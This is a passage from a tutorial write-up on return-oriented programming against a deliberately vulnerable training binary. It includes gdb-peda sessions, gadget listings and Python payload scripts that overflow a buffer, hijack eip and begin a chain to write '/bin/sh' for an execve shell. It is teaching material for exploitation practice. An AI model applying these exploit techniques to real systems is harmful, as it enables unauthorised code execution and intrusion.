</span><span class='line'>   0x8048269 &lt;main+21&gt;: mov    DWORD PTR <span class="o">[</span>esp<span class="o">]</span>,0x80ab680
</span><span class='line'><span class="o">[</span>------------------------------------stack-------------------------------------<span class="o">]</span>
</span><span class='line'>0000<span class="p">|</span> 0xbffff618 --&gt; 0xbffff688 --&gt; 0x0
</span><span class='line'>0004<span class="p">|</span> 0xbffff61c --&gt; 0x8048445 <span class="o">(</span>&lt;__libc_start_main+421&gt;:   mov    DWORD PTR <span class="o">[</span>esp<span class="o">]</span>,eax<span class="o">)</span>
</span><span class='line'>0008<span class="p">|</span> 0xbffff620 --&gt; 0x1
</span><span class='line'>0012<span class="p">|</span> 0xbffff624 --&gt; 0xbffff6b4 --&gt; 0xbffff7ea <span class="o">(</span><span class="s2">&quot;/home/seb/tmp/level0&quot;</span><span class="o">)</span>
</span><span class='line'>0016<span class="p">|</span> 0xbffff628 --&gt; 0xbffff6bc --&gt; 0xbffff7ff <span class="o">(</span><span class="s2">&quot;ORBIT_SOCKETDIR=/tmp/orbit-seb&quot;</span><span class="o">)</span>
</span><span class='line'>0020<span class="p">|</span> 0xbffff62c --&gt; 0x0
</span><span class='line'>0024<span class="p">|</span> 0xbffff630 --&gt; 0x0
</span><span class='line'>0028<span class="p">|</span> 0xbffff634 --&gt; 0x0
</span><span class='line'><span class="o">[</span>------------------------------------------------------------------------------<span class="o">]</span>
</span><span class='line'>Legend: code, data, rodata, value
</span><span class='line'>
</span><span class='line'>Temporary breakpoint 1, 0x08048257 in main <span class="o">()</span>
</span><span class='line'>gdb-peda<span class="nv">$ </span>vmmap
</span><span class='line'>Start      End        Perm    Name
</span><span class='line'>0x08048000 0x080ca000 r-xp    /home/seb/tmp/level0
</span><span class='line'>0x080ca000 0x080cb000 rw-p    /home/seb/tmp/level0
</span><span class='line'>0x080cb000 0x080ef000 rw-p    <span class="o">[</span>heap<span class="o">]</span>
</span><span class='line'>0xb7fff000 0xb8000000 r-xp    <span class="o">[</span>vdso<span class="o">]</span>
</span><span class='line'>0xbffdf000 0xc0000000 rw-p    <span class="o">[</span>stack<span class="o">]</span>
</span></code></pre></td></tr></table></div></figure>


<p>The output of <code>vmmap</code> clearly shows NX in effect: the stack is marked writeable but not executable; the binary, loaded at 0x8048000, is marked executable but not writeable.</p>

<p>So far, so good. Let&rsquo;s continue to run the binary with <code>c</code> and try to overwrite the saved return address on the stack, taking advantage of the <code>_IO_gets</code> call. Note: you can use a patterned buffer for this as well, check out <code>pattern_create</code> and <code>pattern_offset</code> in gdb-peda.</p>

<figure class='code'><figcaption><span></span></figcaption><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
<span class='line-number'>3</span>
<span class='line-number'>4</span>
<span class='line-number'>5</span>
<span class='line-number'>6</span>
<span class='line-number'>7</span>
<span class='line-number'>8</span>
<span class='line-number'>9</span>
<span class='line-number'>10</span>
<span class='line-number'>11</span>
<span class='line-number'>12</span>
<span class='line-number'>13</span>
<span class='line-number'>14</span>
<span class='line-number'>15</span>
<span class='line-number'>16</span>
<span class='line-number'>17</span>
<span class='line-number'>18</span>
<span class='line-number'>19</span>
<span class='line-number'>20</span>
<span class='line-number'>21</span>
<span class='line-number'>22</span>
<span class='line-number'>23</span>
<span class='line-number'>24</span>
<span class='line-number'>25</span>
<span class='line-number'>26</span>
<span class='line-number'>27</span>
<span class='line-number'>28</span>
<span class='line-number'>29</span>
<span class='line-number'>30</span>
<span class='line-number'>31</span>
<span class='line-number'>32</span>
</pre></td><td class='code'><pre><code class='bash'><span class='line'>gdb-peda<span class="nv">$ </span>c
</span><span class='line'><span class="o">[</span>+<span class="o">]</span> ROP tutorial level0
</span><span class='line'><span class="o">[</span>+<span class="o">]</span> What<span class="s1">&#39;s your name? AAAABBBBCCCCDDDDEEEEFFFFGGGGHHHHIIIIJJJJKKKKLLLL</span>
</span><span class='line'><span class="s1">[+] Bet you can&#39;</span>t ROP me, AAAABBBBCCCCDDDDEEEEFFFFGGGGHHHHIIIIJJJJKKKKLLLL!
</span><span class='line'>
</span><span class='line'>Program received signal SIGSEGV, Segmentation fault.
</span><span class='line'><span class="o">[</span>----------------------------------registers-----------------------------------<span class="o">]</span>
</span><span class='line'>EAX: 0x0
</span><span class='line'>EBX: 0x0
</span><span class='line'>ECX: 0xbffff5cc --&gt; 0x80ca720 --&gt; 0xfbad2a84
</span><span class='line'>EDX: 0x80cb690 --&gt; 0x0
</span><span class='line'>ESI: 0x80488e0 <span class="o">(</span>&lt;__libc_csu_fini&gt;:   push   ebp<span class="o">)</span>
</span><span class='line'>EDI: 0x687af80d
</span><span class='line'>EBP: 0x4b4b4b4b <span class="o">(</span><span class="s1">&#39;KKKK&#39;</span><span class="o">)</span>
</span><span class='line'>ESP: 0xbffff620 --&gt; 0x0
</span><span class='line'>EIP: 0x4c4c4c4c <span class="o">(</span><span class="s1">&#39;LLLL&#39;</span><span class="o">)</span>
</span><span class='line'>EFLAGS: 0x10246 <span class="o">(</span>carry PARITY adjust ZERO sign <span class="nb">trap </span>INTERRUPT direction overflow<span class="o">)</span>
</span><span class='line'><span class="o">[</span>-------------------------------------code-------------------------------------<span class="o">]</span>
</span><span class='line'>Invalid <span class="nv">$PC</span> address: 0x4c4c4c4c
</span><span class='line'><span class="o">[</span>------------------------------------stack-------------------------------------<span class="o">]</span>
</span><span class='line'>0000<span class="p">|</span> 0xbffff620 --&gt; 0x0
</span><span class='line'>0004<span class="p">|</span> 0xbffff624 --&gt; 0xbffff6b4 --&gt; 0xbffff7ea <span class="o">(</span><span class="s2">&quot;/home/seb/tmp/level0&quot;</span><span class="o">)</span>
</span><span class='line'>0008<span class="p">|</span> 0xbffff628 --&gt; 0xbffff6bc --&gt; 0xbffff7ff <span class="o">(</span><span class="s2">&quot;ORBIT_SOCKETDIR=/tmp/orbit-seb&quot;</span><span class="o">)</span>
</span><span class='line'>0012<span class="p">|</span> 0xbffff62c --&gt; 0x0
</span><span class='line'>0016<span class="p">|</span> 0xbffff630 --&gt; 0x0
</span><span class='line'>0020<span class="p">|</span> 0xbffff634 --&gt; 0x0
</span><span class='line'>0024<span class="p">|</span> 0xbffff638 --&gt; 0x0
</span><span class='line'>0028<span class="p">|</span> 0xbffff63c --&gt; 0x0
</span><span class='line'><span class="o">[</span>------------------------------------------------------------------------------<span class="o">]</span>
</span><span class='line'>Legend: code, data, rodata, value
</span><span class='line'>Stopped reason: SIGSEGV
</span><span class='line'>0x4c4c4c4c in ?? <span class="o">()</span>
</span></code></pre></td></tr></table></div></figure>


<p>Lucky shot. <code>eip</code> loaded with <code>LLLL</code> because we&rsquo;ve overwritten the return address for <code>main()</code> on the stack. As soon as the <code>ret</code> at the end of <code>main()</code> was executed, it popped the value off of the top of the stack into <code>eip</code> and increased <code>esp</code> with four. Because we&rsquo;ve overwritten that value, we now control <code>eip</code>. To have a look at the stack, issue the following command:</p>

<figure class='code'><figcaption><span></span></figcaption><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
<span class='line-number'>3</span>
<span class='line-number'>4</span>
<span class='line-number'>5</span>
<span class='line-number'>6</span>
</pre></td><td class='code'><pre><code class='bash'><span class='line'>gdb-peda<span class="nv">$ </span>x/20wx <span class="nv">$esp</span>-48
</span><span class='line'>0xbffff5f0:   0x41414141  0x42424242  0x43434343  0x44444444
</span><span class='line'>0xbffff600:   0x45454545  0x46464646  0x47474747  0x48484848
</span><span class='line'>0xbffff610:   0x49494949  0x4a4a4a4a  0x4b4b4b4b  0x4c4c4c4c
</span><span class='line'>0xbffff620:   0x00000000  0xbffff6b4  0xbffff6bc  0x00000000
</span><span class='line'>0xbffff630:   0x00000000  0x00000000  0x00000000  0x00000000
</span></code></pre></td></tr></table></div></figure>


<p><code>x</code> stands for inspect, with the format specifier and amount after the slash (in this case, 20 DWORDS). Finally, give it the address from which you want to inspect. In this case, I chose <code>$esp-48</code>, which is the start of the buffer on the stack. Confirm that this is our input.</p>

<p>So let&rsquo;s use this first bit of information and write a script to reliably overwrite the saved return address on the stack. This will serve as the skeleton for our exploit.</p>

<figure class='code'><figcaption><span></span></figcaption><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
<span class='line-number'>3</span>
<span class='line-number'>4</span>
<span class='line-number'>5</span>
<span class='line-number'>6</span>
<span class='line-number'>7</span>
<span class='line-number'>8</span>
<span class='line-number'>9</span>
<span class='line-number'>10</span>
<span class='line-number'>11</span>
<span class='line-number'>12</span>
<span class='line-number'>13</span>
<span class='line-number'>14</span>
<span class='line-number'>15</span>
<span class='line-number'>16</span>
<span class='line-number'>17</span>
</pre></td><td class='code'><pre><code class='python'><span class='line'><span class="kn">import</span> <span class="nn">struct</span>
</span><span class='line'>
</span><span class='line'><span class="c"># this is a helper function, which will take a 32-bit value and convert it to little-endian.</span>
</span><span class='line'><span class="k">def</span> <span class="nf">p</span><span class="p">(</span><span class="n">x</span><span class="p">):</span>
</span><span class='line'>  <span class="k">return</span> <span class="n">struct</span><span class="o">.</span><span class="n">pack</span><span class="p">(</span><span class="s">&#39;&lt;L&#39;</span><span class="p">,</span> <span class="n">x</span><span class="p">)</span>
</span><span class='line'>  
</span><span class='line'><span class="c"># start our payload as a string of character.</span>
</span><span class='line'><span class="n">payload</span> <span class="o">=</span> <span class="s">&quot;&quot;</span>
</span><span class='line'>
</span><span class='line'><span class="c"># add padding to overwrite upto the saved return address.</span>
</span><span class='line'><span class="n">payload</span> <span class="o">+=</span> <span class="s">&quot;AAAABBBBCCCCDDDDEEEEFFFFGGGGHHHHIIIIJJJJKKKK&quot;</span>
</span><span class='line'>
</span><span class='line'><span class="c"># this part should overwrite the saved return address on the stack.</span>
</span><span class='line'><span class="n">payload</span> <span class="o">+=</span> <span class="n">p</span><span class="p">(</span><span class="mh">0xdeadbeef</span><span class="p">)</span>
</span><span class='line'>
</span><span class='line'><span class="c"># make sure to output the rop chain.</span>
</span><span class='line'><span class="k">print</span> <span class="n">payload</span>
</span></code></pre></td></tr></table></div></figure>


<p>To verify that this will return to <code>0xdeadbeef</code> by overwriting the saved return address, we have two options:</p>

<ol>
<li>run it outside of gdb and inspect the coredump that is generated</li>
<li>run it, store the rop chain in a file and run the binary in gdb with the file as input</li>
</ol>


<h2>Method 1</h2>

<p>Running the exploit in this way is the most accurate way, at least as far as memory layout and stack addresses are concerned. There might be a discrepancy between memory addresses when running within <code>gdb</code> vs outside of <code>gdb</code>. There is a way to fix this, using <a href="">fixenv</a>: I did not know of this solution until BSides!</p>

<figure class='code'><figcaption><span></span></figcaption><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
<span class='line-number'>3</span>
<span class='line-number'>4</span>
<span class='line-number'>5</span>
<span class='line-number'>6</span>
<span class='line-number'>7</span>
<span class='line-number'>8</span>
<span class='line-number'>9</span>
<span class='line-number'>10</span>
<span class='line-number'>11</span>
</pre></td><td class='code'><pre><code class='bash'><span class='line'>seb@minol:~/tmp<span class="nv">$ </span>python poc.py <span class="p">|</span> ./level0
</span><span class='line'><span class="o">[</span>+<span class="o">]</span> ROP tutorial level0
</span><span class='line'><span class="o">[</span>+<span class="o">]</span> What<span class="s1">&#39;s your name? [+] Bet you can&#39;</span>t ROP me, AAAABBBBCCCCDDDDEEEEFFFFGGGGHHHHIIIIJJJJKKKKﾭ�!
</span><span class='line'>Segmentation fault <span class="o">(</span>core dumped<span class="o">)</span>
</span><span class='line'>seb@minol:~/tmp<span class="nv">$ </span>gdb -q ./level0 core
</span><span class='line'>Reading symbols from /home/seb/tmp/level0...<span class="o">(</span>no debugging symbols found<span class="o">)</span>...done.
</span><span class='line'><span class="o">[</span>New LWP 2922<span class="o">]</span>
</span><span class='line'>Core was generated by <span class="sb">`</span>./level0<span class="err">&#39;</span>.
</span><span class='line'>Program terminated with signal 11, Segmentation fault.
</span><span class='line'><span class="c">#0  0xdeadbeef in ?? ()</span>
</span><span class='line'>gdb-peda<span class="err">$</span>
</span></code></pre></td></tr></table></div></figure>


<h2>Method 2</h2>

<p>This method is especially useful if you need to inspect the memory with <code>vmmap</code>: <code>gdb</code> cannot display memory layout of a coredump!</p>

<figure class='code'><figcaption><span></span></figcaption><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
<span class='line-number'>3</span>
<span class='line-number'>4</span>
<span class='line-number'>5</span>
<span class='line-number'>6</span>
<span class='line-number'>7</span>
<span class='line-number'>8</span>
<span class='line-number'>9</span>
<span class='line-number'>10</span>
<span class='line-number'>11</span>
<span class='line-number'>12</span>
<span class='line-number'>13</span>
<span class='line-number'>14</span>
<span class='line-number'>15</span>
<span class='line-number'>16</span>
<span class='line-number'>17</span>
<span class='line-number'>18</span>
<span class='line-number'>19</span>
<span class='line-number'>20</span>
<span class='line-number'>21</span>
<span class='line-number'>22</span>
<span class='line-number'>23</span>
<span class='line-number'>24</span>
<span class='line-number'>25</span>
<span class='line-number'>26</span>
<span class='line-number'>27</span>
<span class='line-number'>28</span>
<span class='line-number'>29</span>
<span class='line-number'>30</span>
<span class='line-number'>31</span>
<span class='line-number'>32</span>
<span class='line-number'>33</span>
<span class='line-number'>34</span>
</pre></td><td class='code'><pre><code class='bash'><span class='line'>seb@minol:~/tmp<span class="nv">$ </span>python poc.py &gt; input_for_bin
</span><span class='line'>seb@minol:~/tmp<span class="nv">$ </span>gdb -q ./level0
</span><span class='line'>Reading symbols from /home/seb/tmp/level0...<span class="o">(</span>no debugging symbols found<span class="o">)</span>...done.
</span><span class='line'>gdb-peda<span class="nv">$ </span>r &lt; input_for_bin
</span><span class='line'><span class="o">[</span>+<span class="o">]</span> ROP tutorial level0
</span><span class='line'><span class="o">[</span>+<span class="o">]</span> What<span class="s1">&#39;s your name? [+] Bet you can&#39;</span>t ROP me, AAAABBBBCCCCDDDDEEEEFFFFGGGGHHHHIIIIJJJJKKKKﾭ�!
</span><span class='line'>
</span><span class='line'>Program received signal SIGSEGV, Segmentation fault.
</span><span class='line'><span class="o">[</span>----------------------------------registers-----------------------------------<span class="o">]</span>
</span><span class='line'>EAX: 0x0
</span><span class='line'>EBX: 0x0
</span><span class='line'>ECX: 0xbffff5cc --&gt; 0x80ca720 --&gt; 0xfbad2a84
</span><span class='line'>EDX: 0x80cb690 --&gt; 0x0
</span><span class='line'>ESI: 0x80488e0 <span class="o">(</span>&lt;__libc_csu_fini&gt;:   push   ebp<span class="o">)</span>
</span><span class='line'>EDI: 0x88c01b86
</span><span class='line'>EBP: 0x4b4b4b4b <span class="o">(</span><span class="s1">&#39;KKKK&#39;</span><span class="o">)</span>
</span><span class='line'>ESP: 0xbffff620 --&gt; 0x0
</span><span class='line'>EIP: 0xdeadbeef
</span><span class='line'>EFLAGS: 0x210246 <span class="o">(</span>carry PARITY adjust ZERO sign <span class="nb">trap </span>INTERRUPT direction overflow<span class="o">)</span>
</span><span class='line'><span class="o">[</span>-------------------------------------code-------------------------------------<span class="o">]</span>
</span><span class='line'>Invalid <span class="nv">$PC</span> address: 0xdeadbeef
</span><span class='line'><span class="o">[</span>------------------------------------stack-------------------------------------<span class="o">]</span>
</span><span class='line'>0000<span class="p">|</span> 0xbffff620 --&gt; 0x0
</span><span class='line'>0004<span class="p">|</span> 0xbffff624 --&gt; 0xbffff6b4 --&gt; 0xbffff7e9 <span class="o">(</span><span class="s2">&quot;/home/seb/tmp/level0&quot;</span><span class="o">)</span>
</span><span class='line'>0008<span class="p">|</span> 0xbffff628 --&gt; 0xbffff6bc --&gt; 0xbffff7fe <span class="o">(</span><span class="s2">&quot;ORBIT_SOCKETDIR=/tmp/orbit-seb&quot;</span><span class="o">)</span>
</span><span class='line'>0012<span class="p">|</span> 0xbffff62c --&gt; 0x0
</span><span class='line'>0016<span class="p">|</span> 0xbffff630 --&gt; 0x0
</span><span class='line'>0020<span class="p">|</span> 0xbffff634 --&gt; 0x0
</span><span class='line'>0024<span class="p">|</span> 0xbffff638 --&gt; 0x0
</span><span class='line'>0028<span class="p">|</span> 0xbffff63c --&gt; 0x0
</span><span class='line'><span class="o">[</span>------------------------------------------------------------------------------<span class="o">]</span>
</span><span class='line'>Legend: code, data, rodata, value
</span><span class='line'>Stopped reason: SIGSEGV
</span><span class='line'>0xdeadbeef in ?? <span class="o">()</span>
</span></code></pre></td></tr></table></div></figure>


<p>Regardless of which method is used, <code>eip</code> now points at <code>0xdeadbeef</code>, which confirms that our proof-of-concept exploit works as intended. We can now start extending the ROP chain to start doing useful things.</p>

<p>In the workshop, I showed the mprotect/read/ret to shellcode strategy. In this writeup, I will use a different way to spawn a shell. We will need access to <code>execve</code> or <code>system()</code> for this.</p>

<p>A lot of students of the ROP workshop tried to find <code>system()</code>, fruitlessly:</p>

<figure class='code'><figcaption><span></span></figcaption><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
</pre></td><td class='code'><pre><code class='bash'><span class='line'>gdb-peda<span class="nv">$ </span>p system
</span><span class='line'>No symbol table is loaded.  Use the <span class="s2">&quot;file&quot;</span> command.
</span></code></pre></td></tr></table></div></figure>


<p><code>system()</code> is not linked in this binary! There is, however, one <code>int 0x80; ret</code> gadget available, which we can use to build a ROP chain. During the workshop in London I showed the <code>mprotect</code> and <code>read</code> strategy. Now, I&rsquo;d like to show how to do an <code>execve</code> syscall using the ROP chain. For added fun, I&rsquo;ll assume that NULL bytes are badchars.</p>

<p>First, however, upload the binary to <a href="http://ropshell.com">ropshell.com</a> or use Your-Favorite-ROP-Gadget-Dumper.</p>

<p>One thing that is <em>absolutely</em> mandatory is access to a gadget that does a syscall. ropshell.com suggests <code>&gt; 0x08052cf0 : int 0x80; ret</code>. Sometimes, there might be another gadget where extra instructions are present between the <code>int</code> and the <code>ret</code>. This is usually fine and you can find them in ropshell.com by searching like this: <code>int 0x80 ?</code>. The extra <code>?</code> indicates that extra opcodes may be present.</p>

<p>Now that we have that all important gadget, we can start building the rest of the ROP chain. We&rsquo;ll need to set a couple of registers and build the argument for <code>execve</code> in memory.</p>

<p>For x86 syscalls, the arguments are passed in registers. <a href="http://syscalls.kernelgrok.com/">This website</a> contains a list of the syscalls and a short description of the arguments. For <code>execve</code>, we see this:</p>

<figure class='code'><figcaption><span></span></figcaption><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
<span class='line-number'>3</span>
<span class='line-number'>4</span>
</pre></td><td class='code'><pre><code class='bash'><span class='line'><span class="nv">eax</span> <span class="o">=</span> syscall <span class="nv">number</span> <span class="o">=</span> 0x0b
</span><span class='line'><span class="nv">ebx</span> <span class="o">=</span> pointer to filename to execute
</span><span class='line'><span class="nv">ecx</span> <span class="o">=</span> pointer to argv
</span><span class='line'><span class="nv">edx</span> <span class="o">=</span> pointer to envp
</span></code></pre></td></tr></table></div></figure>


<p>However, I was unable to get the exploit to work when <code>ecx</code> was pointing to a string. Instead, I opted to set <code>ecx</code> and <code>edx</code> to NULL. Let&rsquo;s start building this ROP chain, starting from the PoC. We will need to write out the string <code>/bin/sh</code> somewhere in memory. For this, we need two things:</p>

<ol>
<li>A location to write the string</li>
<li>A gadget that allows us to write out the string</li>
</ol>


<p>For #1, we can look at the output of vmmap in gdb-peda:</p>

<figure class='code'><figcaption><span></span></figcaption><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
<span class='line-number'>3</span>
<span class='line-number'>4</span>
<span class='line-number'>5</span>
<span class='line-number'>6</span>
<span class='line-number'>7</span>
</pre></td><td class='code'><pre><code class='bash'><span class='line'>gdb-peda<span class="nv">$ </span>vmmap
</span><span class='line'>Start      End        Perm    Name
</span><span class='line'>0x08048000 0x080ca000 r-xp    /home/seb/tmp/level0
</span><span class='line'>0x080ca000 0x080cb000 rw-p    /home/seb/tmp/level0
</span><span class='line'>0x080cb000 0x080ef000 rw-p    <span class="o">[</span>heap<span class="o">]</span>
</span><span class='line'>0xb7fff000 0xb8000000 r-xp    <span class="o">[</span>vdso<span class="o">]</span>
</span><span class='line'>0xbffdf000 0xc0000000 rw-p    <span class="o">[</span>stack<span class="o">]</span>
</span></code></pre></td></tr></table></div></figure>


<p>ASLR is disabled, but taking the heap or stack is not my favorite option. Instead, let&rsquo;s use <code>0x080ca000</code> to <code>0x080cb000</code>. This area is readable and writeable. Not executable but that doesn&rsquo;t matter, as we will not store shellcode there anyway.</p>

<p>For #2, ropshell.com has no good suggestions, as they are <code>add [r32], r32</code> instructions. If the memory contains values already, we&rsquo;ll not be able to write out the string reliably, unless the block of memory contains NULL bytes.</p>

<p>To avoid complications, I searched for <code>mov [?</code> in ropshell.com:</p>

<figure class='code'><figcaption><span></span></figcaption><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
<span class='line-number'>3</span>
<span class='line-number'>4</span>
<span class='line-number'>5</span>
<span class='line-number'>6</span>
<span class='line-number'>7</span>
<span class='line-number'>8</span>
<span class='line-number'>9</span>
<span class='line-number'>10</span>
<span class='line-number'>11</span>
</pre></td><td class='code'><pre><code class='bash'><span class='line'>ropshell&gt; search mov <span class="o">[</span>?
</span><span class='line'>found many, display max <span class="m">256</span> gadgets
</span><span class='line'>&gt; 0x0806bc2b : mov <span class="o">[</span>ecx<span class="o">]</span>, 0x83<span class="p">;</span> ret
</span><span class='line'>&gt; 0x08071e79 : mov <span class="o">[</span>ecx<span class="o">]</span>, 1<span class="p">;</span> ret
</span><span class='line'>&gt; 0x08079191 : mov <span class="o">[</span>edx<span class="o">]</span>, eax<span class="p">;</span> ret
</span><span class='line'>&gt; 0x080a82e8 : mov <span class="o">[</span>eax + 0x4c<span class="o">]</span>, edx<span class="p">;</span> ret
</span><span class='line'>&gt; 0x080a6544 : mov <span class="o">[</span>ecx + 0x1fc0<span class="o">]</span>, 4<span class="p">;</span> ret
</span><span class='line'>&gt; 0x08076839 : mov <span class="o">[</span>ecx + 0x83049a74<span class="o">]</span>, cl<span class="p">;</span> ret
</span><span class='line'>&gt; 0x08052fac : mov <span class="o">[</span>ecx<span class="o">]</span>, 1<span class="p">;</span> pop ebp<span class="p">;</span> ret 4
</span><span class='line'>&gt; 0x080499d2 : mov <span class="o">[</span>ecx<span class="o">]</span>, eax<span class="p">;</span> pop ebp<span class="p">;</span> ret
</span><span class='line'>&gt; 0x080526f6 : mov <span class="o">[</span>ecx<span class="o">]</span>, edx<span class="p">;</span> pop ebp<span class="p">;</span> ret
</span></code></pre></td></tr></table></div></figure>


<p>I like <code>0x08079191 : mov [edx], eax; ret</code> a lot. It&rsquo;s only uses two registers and contains no unnecessary instructions. Let&rsquo;s see how we can set <code>edx</code> and <code>eax</code> to what we need.</p>

<figure class='code'><figcaption><span></span></figcaption><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
<span class='line-number'>3</span>
<span class='line-number'>4</span>
<span class='line-number'>5</span>
<span class='line-number'>6</span>
<span class='line-number'>7</span>
<span class='line-number'>8</span>
<span class='line-number'>9</span>
<span class='line-number'>10</span>
</pre></td><td class='code'><pre><code class='bash'><span class='line'>ropshell&gt; search pop r32
</span><span class='line'>found <span class="m">15</span> gadgets
</span><span class='line'>&gt; 0x0806b893 : pop eax<span class="p">;</span> ret
</span><span class='line'>&gt; 0x080525ee : pop ebx<span class="p">;</span> ret
</span><span class='line'>&gt; 0x080525c6 : pop edx<span class="p">;</span> ret
</span><span class='line'>&gt; 0x0806a5c9 : pop esi<span class="p">;</span> ret
</span><span class='line'>&gt; 0x080516ad : pop edi<span class="p">;</span> ret
</span><span class='line'>&gt; 0x08048550 : pop ebp<span class="p">;</span> ret
</span><span class='line'>&gt; 0x08064630 : pop esp<span class="p">;</span> ret
</span><span class='line'>&gt; 0x080525ed : pop ecx<span class="p">;</span> pop ebx<span class="p">;</span> ret
</span></code></pre></td></tr></table></div></figure>


<p>Plenty of gadgets we can use. The plan is now to pop the address <code>0x080ca040</code> into <code>edx</code> and the value <code>/bin</code> into <code>eax</code>. The address is arbitrary, but chosen such that we don&rsquo;t overwrite anything important or that the address contains NULL bytes. Let&rsquo;s build the first PoC:</p>

<figure class='code'><figcaption><span></span></figcaption><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
<span class='line-number'>3</span>
<span class='line-number'>4</span>
<span class='line-number'>5</span>
<span class='line-number'>6</span>
<span class='line-number'>7</span>
<span class='line-number'>8</span>
<span class='line-number'>9</span>
<span class='line-number'>10</span>
<span class='line-number'>11</span>
<span class='line-number'>12</span>
<span class='line-number'>13</span>
<span class='line-number'>14</span>
<span class='line-number'>15</span>
<span class='line-number'>16</span>
<span class='line-number'>17</span>
<span class='line-number'>18</span>
<span class='line-number'>19</span>
<span class='line-number'>20</span>
<span class='line-number'>21</span>
<span class='line-number'>22</span>
<span class='line-number'>23</span>
<span class='line-number'>24</span>
<span class='line-number'>25</span>
<span class='line-number'>26</span>
<span class='line-number'>27</span>
<span class='line-number'>28</span>
<span class='line-number'>29</span>
<span class='line-number'>30</span>
<span class='line-number'>31</span>
</pre></td><td class='code'><pre><code class='python'><span class='line'><span class="kn">import</span> <span class="nn">struct</span>
</span><span class='line'>
</span><span class='line'><span class="c"># this is a helper function, which will take a 32-bit value and convert it to little-endian.</span>
</span><span class='line'><span class="k">def</span> <span class="nf">p</span><span class="p">(</span><span class="n">x</span><span class="p">):</span>
</span><span class='line'>  <span class="k">return</span> <span class="n">struct</span><span class="o">.</span><span class="n">pack</span><span class="p">(</span><span class="s">&#39;&lt;L&#39;</span><span class="p">,</span> <span class="n">x</span><span class="p">)</span>
</span><span class='line'>  
</span><span class='line'><span class="c"># start our payload as a string of character.</span>
</span><span class='line'><span class="n">payload</span> <span class="o">=</span> <span class="s">&quot;&quot;</span>
</span><span class='line'>
</span><span class='line'><span class="c"># add padding to overwrite upto the saved return address.</span>
</span><span class='line'><span class="n">payload</span> <span class="o">+=</span> <span class="s">&quot;AAAABBBBCCCCDDDDEEEEFFFFGGGGHHHHIIIIJJJJKKKK&quot;</span>
</span><span class='line'>
</span><span class='line'><span class="n">payload</span> <span class="o">+=</span> <span class="n">p</span><span class="p">(</span><span class="mh">0x080525c6</span><span class="p">)</span>   <span class="c"># pop edx; ret</span>
</span><span class='line'><span class="n">payload</span> <span class="o">+=</span> <span class="n">p</span><span class="p">(</span><span class="mh">0x080ca040</span><span class="p">)</span>   <span class="c"># start writing here</span>
</span><span class='line'><span class="n">payload</span> <span class="o">+=</span> <span class="n">p</span><span class="p">(</span><span class="mh">0x0806b893</span><span class="p">)</span>   <span class="c"># pop eax; ret</span>
</span><span class='line'><span class="n">payload</span> <span class="o">+=</span> <span class="s">&#39;/bin&#39;</span>            <span class="c"># first part of /bin/sh</span>
</span><span class='line'><span class="n">payload</span> <span class="o">+=</span> <span class="n">p</span><span class="p">(</span><span class="mh">0x08079191</span><span class="p">)</span>   <span class="c"># mov [edx], eax; ret</span>
</span><span class='line'>
</span><span class='line'><span class="n">payload</span> <span class="o">+=</span> <span class="n">p</span><span class="p">(</span><span class="mh">0x080525c6</span><span class="p">)</span>   <span class="c"># pop edx; ret</span>
</span><span class='line'><span class="n">payload</span> <span class="o">+=</span> <span class="n">p</span><span class="p">(</span><span class="mh">0x080ca044</span><span class="p">)</span>   <span class="c"># just after the first piece of &#39;/bin&#39;</span>
</span><span class='line'><span class="n">payload</span> <span class="o">+=</span> <span class="n">p</span><span class="p">(</span><span class="mh">0x0806b893</span><span class="p">)</span>   <span class="c"># pop eax; ret</span>
</span><span class='line'><span class="n">payload</span> <span class="o">+=</span> <span class="s">&#39;/shX&#39;</span>            <span class="c"># we&#39;ll zero out the X in a moment</span>
</span><span class='line'><span class="n">payload</span> <span class="o">+=</span> <span class="n">p</span><span class="p">(</span><span class="mh">0x08079191</span><span class="p">)</span>   <span class="c"># mov [edx], eax; ret</span>
</span><span class='line'>
</span><span class='line'><span class="n">payload</span> <span class="o">+=</span> <span class="n">p</span><span class="p">(</span><span class="mh">0x08097bff</span><span class="p">)</span>   <span class="c"># xor eax, eax; ret (set eax to 0)</span>
</span><span class='line'><span class="n">payload</span> <span class="o">+=</span> <span class="n">p</span><span class="p">(</span><span class="mh">0x080525c6</span><span class="p">)</span>   <span class="c"># pop edx; ret</span>
</span><span class='line'><span class="n">payload</span> <span class="o">+=</span> <span class="n">p</span><span class="p">(</span><span class="mh">0x080ca047</span><span class="p">)</span>   <span class="c"># zero out the X, making the string NULL terminated</span>
</span><span class='line'><span class="n">payload</span> <span class="o">+=</span> <span class="n">p</span><span class="p">(</span><span class="mh">0x08079191</span><span class="p">)</span>   <span class="c"># mov [edx], eax; ret</span>
</span><span class='line'>
</span><span class='line'><span class="n">payload</span> <span class="o">+=</span> <span class="s">&quot;AAAA&quot;</span>          <span class="c"># crash</span>
</span><span class='line'><span class="k">print</span> <span class="n">payload</span>
</span></code></pre></td></tr></table></div></figure>


<p>Run it and expect the memory area:</p>

<figure class='code'><figcaption><span></span></figcaption><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
<span class='line-number'>3</span>
<span class='line-number'>4</span>
<span class='line-number'>5</span>
<span class='line-number'>6</span>
<span class='line-number'>7</span>
<span class='line-number'>8</span>
<span class='line-number'>9</span>
<span class='line-number'>10</span>
<span class='line-number'>11</span>
<span class='line-number'>12</span>
